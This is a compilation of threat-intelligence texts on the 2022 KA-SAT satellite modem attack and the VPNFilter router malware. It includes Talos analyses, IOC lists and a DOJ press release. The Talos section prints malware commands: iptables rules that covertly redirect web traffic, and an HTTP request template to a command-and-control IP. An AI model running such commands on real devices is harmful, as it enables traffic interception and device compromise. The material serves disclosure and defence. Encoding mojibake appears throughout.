threat scenarios and some technical terms that will be used during this blog post. 2014 - A Wake-Up call for SATCOM Security  2018 - Last Call for SATCOM Security   In the ground segment of the KA-SAT  infrastructure we find 10 gateways distributed across Europe. Please note that the Berlin Gateway is the closest one to Ukraine. Coincidentally, Germany seems to have suffered one the worst parts of the attack. The satellite coverage is divided into the 82 spot beams, each of them is approximately 300km of diameter. As it can be seen in the following image, there are four types of spot beams which enable approximately 240 MHz in both directions (independently for the Forward and Return channels), thus allowing to re-use the slots of available frequencies (1.95 GHz in total, ~((240Mhz*2)*4)) under different polarizations. This throughput requires using multiple Gateway Earth Stations, geographically separated, for properly providing the service.  An important detail is that the mappings between the spot beams and the gateways are fixed: each gateway handles a set of 10 different beams. "
SentinelOne Labs,https://www.viasat.com/about/newsroom/blog/ka-sat-network-cyber-attack-overview/,"On 24 February 2022, a multifaceted and deliberate cyber-attack against Viasatâs KA-SAT network resulted in a partial interruption of KA-SATâs consumer-oriented satellite broadband service. While most users were unaffected by the incident, the cyber-attack did impact several thousand customers located in Ukraine and tens of thousands of other fixed broadband customers across Europe. This incident was localized to a single consumer-oriented partition of the KA-SAT network that is operated on Viasatâs behalf by a Eutelsat subsidiary, Skylogic, under a transition agreement Viasat signed with Eutelsat following Viasatâs purchase of Euro Broadband Infrastructure SÃ rl (âEBIâ), the wholesale broadband services business created as part of Viasatâs former partnering arrangement with Eutelsat. The residential broadband modems affected use the âToowayâ service brand. This cyber-attack did not impact Viasatâs directly managed mobility or government users on the KA-SAT satellite. Similarly, the cyber-attack did not affect users on other Viasat networks worldwide.    Network stabilization and security mitigation actions began immediately, and the network was largely stabilized within hours and fully stabilized within several days. Viasat also undertook proactive operational measures to ensure other essential back-office applications and reporting/analytics services were not impacted. These actions were strictly precautionary while Viasat monitored network behavior and activity.    Viasat, alongside the third-party incident response and forensics leader Mandiant, are continuing to work with Eutelsat/Skylogic, as well as law enforcement and U.S. and international government agencies to investigate the cyber-attack. That investigation is still ongoing. We believe the purpose of the attack was to interrupt service. There is no evidence that any end-user data was accessed or compromised, nor customer personal equipment (PCs, mobile devices, etc.) was improperly accessed, nor is there any evidence that the KA-SAT satellite itself or its supporting satellite ground infrastructure itself were directly involved, impaired or compromised.    Viasat is working closely with the wholesale distributors to bring their customers back online. Because of the wholesale nature of the business, Viasat does not typically transact directly with end-users â instead the distributors work directly with end-customers and can identify those affected to provide support for restoring service. Certain end-customer modems promptly received over-the-air updates, but where such updates are insufficient to timely restore functionality, new modems are being provided as the most efficient way to restore service. Viasat has already shipped tens of thousands of replacement modems to distributors and is ready to ship additional modems as needed.     Incident Summary    At approximately 0302 UTC on 24 February 2022, high volumes of focused, malicious traffic were detected emanating from several SurfBeam2 and SurfBeam 2+ modems and/or associated customer premise equipment (CPE) physically located within Ukraine and serviced by one of the KA-SAT consumer-oriented network partitions. This targeted denial of service attack made it difficult for many modems to remain online.     As Viasat personnel engaged with Skylogic personnel to triage the situation, and worked to force the malicious modems offline, other modems emerged on the network to continue the targeted traffic-based attack throughout the next several hours, degrading the ability of legitimate modems to enter or otherwise remain active on the network.    Around the same time, Viasat and Skylogic began to observe a gradual decline in the number of modems online in the same commercial-oriented partition. This gradual decline of connected modems continued until approximately 0415 UTC, when Viasat and Skylogic observed larger numbers of modems across much of Europe exiting the network over the course of about 45 minutes. All of these modems are serviced by the same consumer-oriented service partition.    Ultimately, tens of thousands of modems that were previously online and active dropped off the network, and these modems were not observed attempting to re-enter the network. The attack impacted a majority of the previously active modems within Ukraine, and a substantial number of additional modems in other parts of Europe.    Subsequent investigation and forensic analysis identified a ground-based network intrusion by an attacker exploiting a misconfiguration in a VPN appliance to gain remote access to the trusted management segment of the KA-SAT network. The attacker moved laterally through this trusted management network to a specific network segment used to manage and operate the network, and then used this network access to execute legitimate, targeted management commands on a large number of residential modems simultaneously. Specifically, these destructive commands overwrote key data in flash memory on the modems, rendering the modems unable to access the network, but not permanently unusable.    Viasat has conducted an exhaustive analysis of impacted modems and confirmed no anomalies or impacts to any electrical components, no impact or compromise of any modem physical or electronic components, no evidence of any compromise or tampering with Viasat modem software or firmware images and no evidence of any supply-chain interference. The modems can be fully restored via a factory reset. To date, Viasat has no evidence that standard modem software or firmware distribution or update processes involved in normal network operations were used or compromised in the attack.     Mitigation and Restoration   Viasat worked with Skylogic to implement several mitigation and recovery actions to restore network stability, preserve continuing service for unaffected end-customers and mitigate or prevent similar attacks. Viasat is leveraging the lessons learned from this incident to further enhance the security features of its products. As this is an ongoing investigation, and to preserve Viasatâs and Skylogicâs ability to safely and securely provide service on the KA-SAT network, specific technical details on those mitigation actions will not be shared publicly at this time.     Throughout the course of the investigation, Viasat continued to provide broadband services to unaffected end-customers, as well as mobility and Viasat government customers who were unaffected by this attack.     Since the attack, Viasat has worked with its distributors to restore service to all customers whose modems were rendered inoperable. Viasat has already shipped nearly 30,000 modems to distributors to bring customers back online. Viasat continues to provide immediately functional modems to distributors who request them so they can support expedited service restoration and impact mitigation for affected end-customers.    Viasat, Mandiant and Skylogic are continuing to cooperate with various law enforcement and government agencies around the world.    Background: KA-SAT network and transition agreement between Viasat and Eutelsat    Eutelsat launched commercial broadband service from the KA-SAT satellite on 31 May 2011.  In April 2021, Viasat completed the purchase of EBI, the wholesale broadband services business created as part of Viasatâs former partnering arrangement with Eutelsat as well as the KA-SAT satellite asset and corresponding ground infrastructure. Skylogic, a subsidiary of Eutelsat, continues to operate and support the ground segment operations of the KA-SAT network on Viasatâs behalf, an arrangement that was originally expected to end sometime later this year. Currently, Viasat is the wholesale provider of satellite broadband services to end-customers served by the KA-SAT network, and its independent network of distributors market and sell these services to primarily residential customers.

SentinelOne Labs,https://blog.talosintelligence.com/2018/05/VPNFilter.html,"For several months, Talos has been working with public- and private-sector threat intelligence partners and law enforcement in researching an advanced, likely state-sponsored or state-affiliated actor's widespread use of a sophisticated modular malware system we call ""VPNFilter."" We have not completed our research, but recent events have convinced us that the correct way forward is to now share our findings so that affected parties can take the appropriate action to defend themselves. Â In particular, the code of this malware overlaps with versions of the BlackEnergy malware â which was responsible for multiple large-scale attacks that targeted devices in Ukraine. While this isn't definitive by any means, we have also observed VPNFilter, a potentially destructive malware, actively infecting Ukrainian hosts at an alarming rate, utilizing a command and control (C2) infrastructure dedicated to that country. Weighing these factors together, we felt it was best to publish our findings so far prior to completing our research. Publishing early means that we don't yet have all the answers â we may not even have all the questions â so this blog represents our findings as of today, and we will update our findings as we continue our investigation.Both the scale and the capability of this operation are concerning. Working with our partners, we estimate the number of infected devices to be at least 500,000 in at least 54 countries. The known devices affected by VPNFilter are Linksys, MikroTik, NETGEAR and TP-Link networking equipment in the small and home office (SOHO) space, as well at QNAP network-attached storage (NAS) devices. No other vendors, including Cisco, have been observed as infected by VPNFilter, but our research continues. The behavior of this malware on networking equipment is particularly concerning, as components of the VPNFilter malware allows for theft of website credentials and monitoring of Modbus SCADA protocols. Lastly, the malware has a destructive capability that can render an infected device unusable, which can be triggered on individual victim machines or en masse, and has the potential of cutting off internet access for hundreds of thousands of victims worldwide.The type of devices targeted by this actor are difficult to defend. They are frequently on the perimeter of the network, with no intrusion protection system (IPS) in place, and typically do not have an available host-based protection system such as an anti-virus (AV) package. We are unsure of the particular exploit used in any given case, but most devices targeted, particularly in older versions, have known public exploits or default credentials that make compromise relatively straightforward. All of this has contributed to the quiet growth of this threat since at least 2016.This post provides the technical findings you would normally see in a Talos blog. In addition, we will detail some thoughts on the tradecraft behind this threat, using our findings and the background of our analysts, to discuss the possible thought process and decisions made by the actor. We will also discuss how to defend against this threat and how to handle a device that may be infected. Finally, we will share the IOCs that we have observed to this point, although we are confident there are more that we have not seen. The VPNFilter malware is a multi-stage, modular platform with versatile capabilities to support both intelligence-collection and destructive cyber attack operations.The stage 1 malware persists through a reboot, which sets it apart from most other malware that targets internet-of-things devices because malware normally does not survive a reboot of the device. The main purpose of stage 1 is to gain a persistent foothold and enable the deployment of the stage 2 malware. Stage 1 utilizes multiple redundant command and control (C2) mechanisms to discover the IP address of the current stage 2 deployment server, making this malware extremely robust and capable of dealing with unpredictable C2 infrastructure changes.The stage 2 malware, which does not persist through a reboot, possesses capabilities that we have come to expect in a workhorse intelligence-collection platform, such as file collection, command execution, data exfiltration and device management. However, some versions of stage 2 also possess a self-destruct capability that overwrites a critical portion of the device's firmware and reboots the device, rendering it unusable. Based on the actor's demonstrated knowledge of these devices, and the existing capability in some stage 2 versions, we assess with high confidence that the actor could deploy this self-destruct command to most devices that it controls, regardless of whether the command is built into the stage 2 malware.In addition, there are multiple stage 3 modules that serve as plugins for the stage 2 malware. These plugins provide stage 2 with additional functionality. As of this writing, we are aware of two plugin modules: a packet sniffer for collecting traffic that passes through the device, including theft of website credentials and monitoring of Modbus SCADA protocols, and a communications module that allows stage 2 to communicate over Tor. We assess with high confidence that several other plugin modules exist, but we have yet to discover them. We assess with high confidence that this malware is used to create an expansive, hard-to-attribute infrastructure that can be used to serve multiple operational needs of the threat actor. Since the affected devices are legitimately owned by businesses or individuals, malicious activity conducted from infected devices could be mistakenly attributed to those who were actually victims of the actor. The capabilities built into the various stages and plugins of the malware are extremely versatile and would enable the actor to take advantage of devices in multiple ways.Advanced threat actors, including nation-states, will try to make attribution of their cyber activities extremely difficult, unless it is in their interest for it to be openly known that they conducted a specific act. To this end, advanced threat actors use multiple techniques, including co-opting infrastructure owned by someone else to conduct their operations. The actor could easily use devices infected with this malware as hop points before connecting to their final victim in order to obfuscate their true point of origin.The malware can also be leveraged to collect data that flows through the device. This could be for straightforward data-collection purposes, or to assess the potential value of the network that the device serves. If the network was deemed as having information of potential interest to the threat actor, they may choose to continue collecting content that passes through the device or to propagate into the connected network for data collection. At the time of this posting, we have not been able to acquire a third-stage plugin that would enable further exploitation of the network served by the device. However, we have seen indications that it does exist, and we assess that it is highly likely that such an advanced actor would naturally include that capability in malware that is this modular.Finally, this malware could be used to conduct a large-scale destructive attack by using the ""kill"" command, which would render some or all of the physical devices unusable. This command is present in many of the stage 2 samples we've observed, but could also be triggered by utilizing the ""exec"" command available in all stage 2 samples. In most cases, this action is unrecoverable by most victims, requiring technical capabilities, know-how, or tools that no consumer should be expected to have. We are deeply concerned about this capability, and it is one of the driving reasons we have been quietly researching this threat over the past few months. As we have researched this threat, we have put into place monitoring and scanning to gain an understanding of the scope of this threat and the behaviors of infected devices. Our analysis has shown that this is a global, broadly deployed threat that is actively seeking to increase its footprint. While our research continues, we have also observed activity potentially associated with this actor that indicates possible data exfiltration activity.In early May, we observed infected devices conducting TCP scans on ports 23, 80, 2000 and 8080. These ports are indicative of scanning for additional Mikrotik and QNAP NAS devices, which can be found using these ports. These scans targeted devices in more than 100 countries.We also used our telemetry to discover potentially infected devices globally. We evaluated their collective behavior to try and identify additional features of the C2 infrastructure. Many of these victim IPs appeared to demonstrate behavior that strongly indicated data exfiltration.Finally, on May 8, we observed a sharp spike in VPNFilter infection activity. Almost all of the newly acquired victims were located in Ukraine. Also of note, a majority of Ukrainian infections shared a separate stage 2 C2 infrastructure from the rest of the world, on IP 46.151.209[.]33. By this point, we were aware of the code overlap between BlackEnergy and VPNFilter and that the timing of previous attacks in Ukraine suggested that an attack could be imminent. Given each of these factors, and in consultation with our partners, we immediately began the process to go public before completing our research.As we continued to move forward with the public disclosure, we observed another substantial increase in newly acquired VPNFilter victims focused in Ukraine on May 17. This continued to drive our decision to publish our research as soon as possible. Defending against this threat is extremely difficult due to the nature of the affected devices. The majority of them are connected directly to the internet, with no security devices or services between them and the potential attackers. This challenge is augmented by the fact that most of the affected devices have publicly known vulnerabilities which are not convenient for the average user to patch. Additionally, most have no built-in anti-malware capabilities. These three facts together make this threat extremely hard to counter, resulting in extremely limited opportunities to interdict malware, remove vulnerabilities, or block threats.Despite these challenges, Talos has released protections for this threat from multiple angles, to try to take advantage of the limited options that exist. We developed and deployed more than 100 Snort signatures for the publicly known vulnerabilities for the devices that are associated with this threat. These rules have been deployed in the public Snort set, and can be used by anyone to help defend their devices. In addition, we have done the usual blocklisting of domains/IPs as appropriate and convicting of the hashes associated with this threat to cover those who are protected by the Cisco Security ecosystem. We have reached out to Linksys, Mikrotik, Netgear, TP-Link and QNAP regarding this issue. (Note: QNAP has been aware of certain aspects of VPNFilter and previously done work to counter the threat.) Finally, we have also shared these indicators and our research with international law enforcement and our fellow members of the Cyber Threat Alliance in advance of this publication so they could move quickly to help counter this threat more broadly. We recommend that: Due to the potential for destructive action by the threat actor, we recommend out of an abundance of caution that these actions be taken for all SOHO or NAS devices, whether or not they are known to be affected by this threat. At the time of this publication, we do not have definitive proof on how the threat actor is exploiting the affected devices. However, all of the affected makes/models that we have uncovered had well-known, public vulnerabilities. Since advanced threat actors tend to only use the minimum resources necessary to accomplish their goals, we assess with high confidence that VPNFilter required no zero-day exploitation techniques. VPNFilter's stage 1 malware infects devices running firmware based on Busybox and Linux, and is compiled for several CPU architectures. The main purpose of these first-stage binaries is to locate a server providing a more fully featured second stage, and to download and maintain persistence for this next stage on infected devices. It is capable of modifying non-volatile configuration memory (NVRAM) values and adds itself to crontab, the Linux job scheduler, to achieve persistence. This is a departure from previous IoT malware, like Mirai, which is ephemeral and disappears with a simple device reboot.Talos analyzed samples for MIPS and x86 processors. The C2 communication and additional malware downloads occur over Tor or SSL-encrypted connections. While the binaries themselves are not obfuscated beyond being stripped, some strings are stored in an encrypted form, and are only decrypted at runtime. The decryption routine looked suspiciously similar to RC4 in the static analysis, but it looks like the malware authors got the initialization of the S-boxes wrong. During the permutation step, values are XORâd, but not swapped. Analysis of this RC4 implementation shows that it is identical to the implementation used in BlackEnergy, which is believed by law enforcement agencies to originate with a state actor. The RC4 initialization XORs the values in the permutation phase of the internal state initialization. As you can see in the last basic block, the code doesn't swap the values of S[i] and S[j] (compared to the RC4 pseudo code below). Once the malware has completed initialization, it starts to download pages from the seed URLs. In the MIPS sample cache and all but one URL of the x86 sample, the URLs pointed to Photobucket.com, an image-sharing host. The malware downloads the first image from the gallery the URL is referencing, and then proceeds to extract the download server's IP address. The IP address is extracted from six integer values for GPS latitude and longitude in the EXIF information.If stage 1 fails to connect to, download an image from, or successfully acquire an IP address via an image from Photobucket, the malware reaches out to a backup domain, toknowall[.]com, to download an image and attempt the same process.If the attempt to the backup domain fails, stage 1 opens a listener that waits for a specific trigger packet to open a connection for the actor to connect interactively to the device. When the listener opens, it checks its public IP from api.ipify[.]org and stores it for later comparison. Then, when any packet arrives on any port, the listener performs a series of checks to identify a trigger packet. If the packet meets a predefined set of criteria, it will extract an IP address from the packet and attempt a stage 2 download. The stage 2 malware first sets up the working environment by creating a modules folder (/var/run/vpnfilterm) and a working directory (/var/run/vpnfilterw). Afterward, it will run in a loop, where it first reaches out to a C2 server, and then executes commands retrieved from the C2. The command names are encrypted with the same broken RC4 function as in stage 1. Fortunately, older versions of x86 stage 2 sample were very verbose, and debug printed all the steps it performed. Newer versions of the x86 stage 2 did not contain the debug prints, nor did the MIPS sample.The x86 sample can perform the following operations: The MIPS sample has the following additional operations: Until the Tor module is installed, stage 2 will use one or more IPs stored in its configuration as SOCKS5 proxies to Tor and attempt to communicate with a control panel also found in its configuration. Like in stage 1, the communication between the malware and the proxy will connect over a verified SSL connection. When the Tor module is installed, it will connect to .onion domains through the local SOCKS5 proxy provided by the module over plain HTTP instead. We used a fake SOCKS5 proxy, which redirects all traffic to INetSim for analysis.An example request from the malware to the server: The malware encodes this request into a JSON object, which is then base64-encoded and sent to the path /bin32/update.php in the HTTP POST parameter ""me"". The user agent used in the request is peculiar (Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)), as a version ""Windows NT 5.3"" doesn't exist. We have analyzed two plugin modules for the malware, a packet sniffer and a communication plugin that allows the malware to communicate over Tor. We assess with high confidence that there are likely several more that we have not yet discovered. Among the initial samples Talos acquired, there was a plugin for the MIPS stage 2, which is a packet sniffer. It intercepts all network traffic through a raw socket and looks for strings used in HTTP basic authentications. Further, it specifically tracks Modbus TCP/IP packets. The resulting log file is placed in the stage 2 working directory, /var/run/vpnfilterw. This allows the attackers to understand, capture, and track the traffic flowing through the device.The Tor plugin module is partially linked into stage 2, but has a separate Tor executable, which is downloaded to /var/run/tor and run in a process separate from stage 2. The Tor binary looks like the standard Tor client, in the form of a statically linked and stripped binary. It creates a configuration file in /var/run/torrc and a working directory in /var/run/tord. VPNFilter is an expansive, robust, highly capable, and dangerous threat that targets devices that are challenging to defend. Its highly modular framework allows for rapid changes to the actor's operational infrastructure, serving their goals of misattribution, intelligence collection, and finding a platform to conduct attacks.The destructive capability particularly concerns us. This shows that the actor is willing to burn users' devices to cover up their tracks, going much further than simply removing traces of the malware. If it suited their goals, this command could be executed on a broad scale, potentially rendering hundreds of thousands of devices unusable, disabling internet access for hundreds of thousands of victims worldwide or in a focused region where it suited the actor's purposes.While the threat to IoT devices is nothing new, the fact that these devices are being used by advanced nation-state actors to conduct cyber operations, which could potentially result in the destruction of the device, has greatly increased the urgency of dealing with this issue. We call on the entire security community to join us in aggressively countering this threat.We will continue to monitor VPNFilter and work with our partners to understand the threat as it continues to evolve in order to ensure that our customers remain protected and the public is informed. As stated previously, we highly suspect that there are additional IOCs and versions of this malware that we are not currently aware of. The following list of IOCs comprises what we know as of this date. photobucket[.]com/user/nikkireed11/libraryphotobucket[.]com/user/kmila302/libraryphotobucket[.]com/user/lisabraun87/libraryphotobucket[.]com/user/eva_green1/libraryphotobucket[.]com/user/monicabelci4/libraryphotobucket[.]com/user/katyperry45/libraryphotobucket[.]com/user/saragray1/libraryphotobucket[.]com/user/millerfred/libraryphotobucket[.]com/user/jeniferaniston1/libraryphotobucket[.]com/user/amandaseyfried1/libraryphotobucket[.]com/user/suwe8/libraryphotobucket[.]com/user/bob7301/librarytoknowall[.]com 91.121.109[.]209217.12.202[.]4094.242.222[.]6882.118.242[.]12446.151.209[.]33217.79.179[.]1491.214.203[.]14495.211.198[.]231195.154.180[.]605.149.250[.]5491.200.13[.]7694.185.80[.]8262.210.180[.]229zuh3vcyskd4gipkm[.]onion/bin32/update.php 50ac4fcd3fbc8abcaa766449841b3a0a684b3e217fc40935f1ac22c34c58a9ec0e0094d9bd396a6594da8e21911a3982cd737b445f591581560d766755097d92 9683b04123d7e9fe4c8c26c69b09c2233f7e1440f828837422ce330040782d17d6097e942dd0fdc1fb28ec1814780e6ecc169ec6d24f9954e71954eedbc4c70e4b03288e9e44d214426a02327223b5e516b1ea29ce72fa25a2fcef9aa65c4b0b9eb6c779dbad1b717caa462d8e040852759436ed79cc2172692339bc6243238737e29b0ea7a9b97597385a12f525e13c3a7d02ba4161a6946f2a7d978cc045b4776cb9a7a9f5afbaffdd4dbd052c6420030b2c7c3058c1455e0a79df0e6f7a1d8a20dc9538d639623878a3d3d18d88da8b635ea52e5e2d0c2cce4a8c5a703db10649fda8888d701eb2f91e6e0a05a2e2be714f564497c44a3813082ef8ff250b f8286e29faa67ec765ae0244862f6b7914fcdde10423f96595cb84ad5cc6b344afd281639e26a717aead65b1886f98d6d6c258736016023b4e59de30b7348719 d113ce61ab1e4bfcb32fb3c53bd3cdeee81108d02d3886f6e2286e0b6a006747c52b3901a26df1680acbfb9e6184b321f0b22dd6c4bb107e5e071553d375c851f372ebe8277b78d50c5600d0e2af3fe29b1e04b5435a7149f04edd165743c16dbe4715b029cbd3f8e2f37bc525005b2cb9cad977117a26fac94339a721e3f2a527af4b890db1a611d0054d5d4a7d9a36c9f52dffeb67a053be9ea03a495a9302110da84f31e7868ad741bcb0d9f7771a0bb39c44785055e6da0ecc393598adc8fb47ba27dceea486aab7a0f8ec5674332ca1f6af962a1724df89d658d470348fb25336c2dd388459dec37fa8d0467cf2ac3c81a272176128338a2c1d7c083c78cd75d3a70e3218688bdd23a0f618add964603736f7c899265b1d8386b9902526110da84f31e7868ad741bcb0d9f7771a0bb39c44785055e6da0ecc393598adc8909cf80d3ef4c52abc95d286df8d218462739889b6be4762a1d2fac1adb2ec2b044bfa11ea91b5559f7502c3a504b19ee3c555e95907a98508825b4aa56294e4c0f8bde03df3dec6e43b327378777ebc35d9ea8cfe39628f79f20b1c40c1b4128f1d0cd5dd6585c3d5d478e18a85e7109c8a88489c46987621e01d21fab5095dd5dec646c957305d91303a1d7931b30e7fb2f38d54a1102e14fd7a4b9f6e0806c0f8bde03df3dec6e43b327378777ebc35d9ea8cfe39628f79f20b1c40c1b412 The following devices are known to be affected by this threat. Based on the scale of this research, much of our observations are remote and not on the device, so it is difficult to determine specific version numbers and models in many cases.

             Archived News Para NotÃ­cias en EspaÃ±ol The Justice Department today announced an effort to disrupt a global botnet of hundreds of thousands of infected home and office (SOHO) routers and other networked devices under the control of a group of actors known as the âSofacy Groupâ (also known as âapt28,â âsandworm,â âx-agent,â âpawn storm,â âfancy bearâ and âsednitâ).  The group, which has been operating since at least in or about 2007, targets government, military, security organizations, and other targets of perceived intelligence value. Assistant Attorney General for National Security John C. Demers, U.S. Attorney Scott W. Brady for the Western District of Pennsylvania, Assistant Director Scott Smith for the FBIâs Cyber Division, FBI Special Agent in Charge Robert Johnson of the Pittsburgh Division and FBI Special Agent in Charge David J. LeValley of the Atlanta Division made the announcement.

âThe Department of Justice is committed to disrupting, not just watching, national security cyber threats using every tool at our disposal, and todayâs effort is another example of our commitment to do that,â said Assistant Attorney General Demers.  âThis operation is the first step in the disruption of a botnet that provides the Sofacy actors with an array of capabilities that could be used for a variety of malicious purposes, including intelligence gathering, theft of valuable information, destructive or disruptive attacks, and the misattribution of such activities.â

âThe United States Attorneyâs Office will continue to aggressively fight against threats to our national security by criminals, no matter who they work forâ said U.S. Attorney Brady.  âThis court-ordered seizure will assist in the identification of victim devices and disrupts the ability of these hackers to steal personal and other sensitive information and carry out disruptive cyber attacks.  We will be relentless in protecting the people of Western Pennsylvania - from international corporations to local businesses to the elderly - from these threats.â

âToday's announcement highlights the FBI's ability to take swift action in the fight against cybercrime and our commitment to protecting the American people and their devices,â said Assistant Director Scott Smith. âBy seizing a domain used by malicious cyber actors in their botnet campaign, the FBI has taken a critical step in minimizing the impact of the malware attack. While this is an important first step, the FBI's work is not done. The FBI, along with our domestic and international partners, will continue our efforts to identify and expose those responsible for this wave of malware.â

âThe FBI will not allow malicious cyber actors, regardless of whether they are state-sponsored, to operate freely,â said FBI Special Agent in Charge Bob Johnson. âThese hackers are exploiting vulnerabilities and putting every Americanâs privacy and network security at risk. Although there is still much to be learned about how this particular threat initially compromises infected routers and other devices, we encourage citizens and businesses to keep their network equipment updated and to change default passwords.â

âThis action by the FBI, DOJ, and our partners should send a clear message to our adversaries that the U.S. Government will take action to mitigate the threats posed by them and to protect our citizens and our allies even when the possibility of arrest and prosecution may not be readily available,â said FBI Special Agent in Charge David J. LeValley. âAs our adversariesâ technical capabilities evolve, the FBI and its partners will continue to rise to the challenge, placing themselves between the adversaries and their intended victims.â

The botnet, referred to by the FBI and cyber security researchers as âVPNFilter,â targets SOHO routers and network-access storage (NAS) devices, which are hardware devices made up of several hard drives used to store data in a single location that can be accessed by multiple users.  The VPNFilter botnet uses several stages of malware. Although the second stage of malware, which has the malicious capabilities described above, can be cleared from a device by rebooting it, the first stage of malware persists through a reboot, making it difficult to prevent reinfection by the second stage.

In order to identify infected devices and facilitate their remediation, the U.S. Attorneyâs Office for the Western District of Pennsylvania applied for and obtained court orders, authorizing the FBI to seize a domain that is part of the malwareâs command-and-control infrastructure.  This will redirect attempts by stage one of the malware to reinfect the device to an FBI-controlled server, which will capture the Internet Protocol (IP) address of infected devices, pursuant to legal process. A non-profit partner organization, The Shadowserver Foundation, will disseminate the IP addresses to those who can assist with remediating the VPNFilter botnet, including foreign CERTs and internet service providers (ISPs).  

Owners of SOHO and NAS devices that may be infected should reboot their devices as soon as possible,  temporarily eliminating the second stage malware and causing the first stage malware on their device to call out for instructions.  Although devices will remain vulnerable to reinfection with the second stage malware while connected to the Internet, these efforts maximize opportunities to identify and remediate the infection worldwide in the time available before Sofacy actors learn of the vulnerability in their command-and-control infrastructure.

The FBI and the Department of Homeland Security have also jointly notified trusted ISPs.  The Department and the FBI also encourage users and administrators to review the Cisco blog post on VPNFilter, available HERE, for recommendations and to ensure that their devices are updated with the latest patches.

The efforts to disrupt the VPNFilter botnet were led by the FBIâs Pittsburgh and Atlanta Offices; FBI Cyber Division;  Trial Attorney Matthew Chang of the National Security Divisionâs Counterintelligence and Export Control Section; and Assistant U.S. Attorneys Charles Eberle and Soo C. Song of the Western District Pennsylvania.  Critical assistance was also provided by Richard Green of the Criminal Divisionâs Computer Crime and Intellectual Property Section and The Shadowserver Foundation.

SentinelOne Labs,https://blog.talosintelligence.com/2018/09/vpnfilter-part-3.html,"VPNFilter â a multi-stage, modular framework that has infected hundreds of thousands of network devices across the globe â is now known to possess even greater capabilities. Cisco Talos recently discovered seven additional third-stage VPNFilter modules that add significant functionality to the malware, including an expanded ability to exploit endpoint devices from footholds on compromised network devices. The new functions also include data filtering and multiple encrypted tunneling capabilities to mask command and control (C2) and data exfiltration traffic. And while we believe our work, and the work of our international coalition of partners, has mostly neutralized the threat from VPNFilter, it can still be difficult to detect in the wild if any devices remain unpatched.Talos has been researching VPNFilter for months. Our initial findings are outlined here, and a description of additional modules used by the framework is here. As part of our continued investigation, we developed a technique to examine a key protocol used by MikroTik networking devices to hunt for possible exploitation methods used by the actor.As we followed the thread of VPNFilter infections, it became clear that MikroTik network devices were heavily targeted by the threat actor, especially in Ukraine. Since these devices seemed to be critical to the actor's operational goals, this led us to try to understand how they were being exploited. Part of our investigation included the study of the protocol used by MikroTik's Winbox administration utility. In this blog, we'll share how and why we studied this protocol, as well as the decoder tool we developed as a way of helping the security community look into this protocol for potential malicious actor activity.The sophistication of VPNFilter drives home the point that this is a framework that all individuals and organizations should be tracking. Only an advanced and organized defense can combat these kinds of threats, and at the scale that VPNFilter is at, we cannot afford to overlook these new discoveries. The discovery of these additional VPNFilter third-stage modules has significantly added to our understanding of what we already knew to be an extremely potent threat. Together, these modules added: We were able to confirm the existence and capabilities of the malware after reverse-engineering these additional modules. Previously, we had to make analytic assessments on the existence and nature of these capabilities based solely on telemetry analysis, which always leaves room for error.For example, we had previously noted what appeared to be devices compromised by VPNFilter conducting scans of large IP spaces that seemed focused on identifying other devices vulnerable to the methods of exploitation used by the actor associated with the VPNFilter malware. However, now we can discuss the specific third-stage module used for this activity.As a result of our continued research, we have furthered our understanding of the full scope of the capabilities associated with VPNFilter after examining these additional third-stage modules. As previously described, Talos identified the following seven additional third-stage modules that greatly expanded the capabilities present within VPNFilter. Each of these modules is described in detail in the following sections. htpx is a third-stage module for VPNFilter. This module shares similar code with the 'ssler' module previously documented by Talos. The module relies heavily on open-source code that can be traced to the original projects based on strings present within the binary. A good example is 'libiptc.c', which is part of Netfilter. The primary function present within the 'htpx' module is responsible for setting up iptables rules to forward network traffic destined for TCP port 80 to a local server running on port 8888. This redirection is accomplished by first loading kernel modules that allow for traffic management. These modules (Ip_tables.ko , Iptable_filter.ko, and Iptable_nat.ko) are loaded with the insmod shell command.The htpx module then issues the following commands to surreptitiously forward traffic: iptables -I INPUT -p tcp --dport 8888 -j ACCEPTiptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888It also periodically checks to ensure that these rules remain present by issuing similar delete commands then re-adding them. A temp file is also created called /var/run/htpx.pid.The following HTTP request is then generated: GET %s HTTP/1.1\r\nHost: 103.6.146.194\r\nAccept: */*\r\nUser-Agent: curl53\r\n\r\nDuring our analysis of the 'htpx' module, we were unable to elicit a response from C2 infrastructure, so we were unable to observe additional module operations. During our analysis of the module binary, we identified that the module inspects HTTP communications to identify the presence of Windows executables. When they are encountered, the executable is flagged and added to a table. We assess with moderate confidence that this module could be leveraged by attackers to download a binary payload and allow for on-the-fly patching of Windows executables as they pass through compromised devices. The ndbr module is a module with SSH capabilities that also has the ability to port-scan other IPs. This module uses the dropbear SSH server and client and is a modified version of the dbmulti utility version 2017.75. We have identified several modifications to the standard dropbear functionality.The first modifications are to the dbmulti utility itself. The typical utility can function as an SSH client, SSH server, perform data transfers using SCP, generate keys, or convert keys. The functionality is determined either by the program name or the first parameter passed to the program. The 'ndbr' module has replaced the ability to generate or convert keys with a network mapping (i.e., port-scanning) function as well as another function called 'ndbr.'Like the original ""dbmulti"" utility, the ndbr module's functionality depends either on the name of the program or the first argument passed to the program. The arguments that the ndbr module accepts are dropbear, dbclient, ssh, scp, ndbr, and nmap. A description of each of these arguments can be found in the following sections. The dropbear command instructs the 'ndbr' module to operate as an SSH server. The original dropbear code uses the default SSH port (TCP/22) to listen for connections. However, the code present within the 'ndbr' module has been modified to use a default port of TCP/63914. Other modifications to the original dropbear code change the way that host keyfiles are handled. The default keyfile path has been changed to /db_key, but the 'ndbr' module does not drop this file. Instead, the buf_readfile dropbear function has been modified to load the proper key from memory when the filename parameter is equal to /db_key.Instead of using password-based authentication, the dropbear server has been modified to authenticate via a proper public key, which is also embedded in the 'ndbr' executable. A bug in this modified code mishandles connections attempting to use an incorrect public key. These authentication failures cause the ndbr SSH server to become stuck in an infinite loop. There is no indication to the client, however, that the authentication has failed. At this time, we have been unable to identify a correct key that would allow for successful authentication with the ndbr SSH server â neither of the keys embedded in the 'ndbr' module (i.e., /db_key and /cli_key) were correct, and no corresponding keys were found in any other VPNFilter-related binaries. If passed the dbclient or ssh parameter, the 'ndbr' module acts as the standard dropbear SSH command-line interface client but with modifications to its default options. As with the default keyfile with dropbear server command, the dbclient/ssh commands have a default identity file: /cli_key. At this time, we do not know what the dbclient (SSH client) is expected to connect to. If passed the nmap argument, the ndbr module will perform a port scan of an IP or range of IPs.The usage is: Usage %s -ip* <ip-addr: 192.168.0.1/ip-range 192.168.0.0./24> -p* <port: 80/port-range: 25-125> -noping <default yes> 